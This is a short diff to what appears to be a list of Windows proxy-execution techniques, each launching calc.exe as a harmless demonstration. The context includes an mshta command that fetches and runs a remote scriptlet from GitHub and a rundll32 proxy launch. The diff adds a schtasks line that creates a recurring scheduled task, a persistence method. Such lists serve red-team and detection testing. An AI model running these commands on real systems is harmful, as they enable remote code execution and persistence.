@@ -28,3 +28,6 @@ mshta https://raw.githubusercontent.com/losttroll/runcalc/main/calc.sct
 
 ## RunDLL32.exe
 rundll32.exe pcwutl.dll,LaunchApplication C:\Windows\System32\calc.exe
+
+## Task Scheduler
+schtasks /Create /F /SC MINUTE /MO 3 /ST 11:50 /TN CalcLocalTask /TR "calc.exe"
